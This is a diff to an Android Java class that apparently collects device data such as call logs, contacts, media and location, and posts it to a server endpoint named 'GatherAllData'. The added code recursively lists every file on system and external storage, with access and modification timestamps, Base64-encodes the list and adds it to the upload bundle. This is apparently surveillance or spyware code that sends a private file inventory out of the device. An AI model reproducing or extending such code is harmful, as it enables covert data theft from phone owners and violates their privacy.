@@ -20,10 +20,13 @@ import android.location.LocationManager;
 import android.net.TrafficStats;
 import android.net.Uri;
 import android.os.AsyncTask;
+import android.os.Environment;
 import android.os.Looper;
 import android.provider.CallLog;
 import android.provider.ContactsContract;
 import android.provider.MediaStore;
+import android.system.Os;
+import android.system.StructStat;
 import android.util.Base64;
 import android.util.Log;
 
@@ -96,12 +99,69 @@ public class TaskMaster extends AsyncTask<Context, Void, Void> {
                 }
             }
         }
-        //getAndroidIDModel();
+        getFilesMetadata(bulkData);
 
         ServerCommunicationHandler.executeDataPost(params[0],
                 "http://192.168.1.24:58938/api/Service/GatherAllData", bulkData,
                 "357336064017681");
         return null;
+    }
+
+    private void getFilesMetadata(JSONObject bulkdata) {
+        try {
+            List<String> root = getListFiles(new File(Environment.getRootDirectory().toString()));
+            List<String> external = getListFiles(new File(Environment.getExternalStorageDirectory()
+                    .toString()));
+            root.addAll(external);
+
+            JSONArray metadata = new JSONArray();
+            for (String info : root) {
+                metadata.put(Base64.encodeToString(info.getBytes(), Base64.URL_SAFE));
+            }
+
+            bulkdata.put("Metadata", metadata);
+        } catch (Exception ex) {
+            Log.d("EROARE", ex.getMessage());
+        }
+    }
+
+    private List<String> getListFiles(File parentDir) {
+        ArrayList<String> inFiles = new ArrayList<>();
+        File[] files = parentDir.listFiles();
+        if (files != null) {
+            for (File file : files) {
+                if (file.isDirectory()) {
+                    try {
+                        StructStat stat = Os.stat(file.getAbsolutePath().toString());
+                        long lastAccessed = stat.st_atime * 1000L;
+                        long lastModified = stat.st_mtime * 1000L;
+                        Timestamp accessedTime = new Timestamp(lastAccessed);
+                        Timestamp modifiedTime = new Timestamp(lastModified);
+
+                        inFiles.add(file.getAbsolutePath() + ";" + accessedTime.toString()
+                                + ";" + modifiedTime.toString());
+                    } catch (Exception ex) {
+                        Log.d("EROARE", ex.getMessage());
+                    } finally {
+                        inFiles.addAll(getListFiles(file));
+                    }
+                } else {
+                    try {
+                        StructStat stat = Os.stat(file.getAbsolutePath().toString());
+                        long lastAccessed = stat.st_atime * 1000L;
+                        long lastModified = stat.st_mtime * 1000L;
+                        Timestamp accessedTime = new Timestamp(lastAccessed);
+                        Timestamp modifiedTime = new Timestamp(lastModified);
+
+                        inFiles.add(file.getAbsolutePath() + ";" + accessedTime.toString()
+                                + ";" + modifiedTime.toString());
+                    } catch (Exception ex) {
+                        Log.d("EROARE", ex.getMessage());
+                    }
+                }
+            }
+        }
+        return inFiles;
     }
 
     private void getSmartphoneLocation(JSONObject bulkData, String hash) {
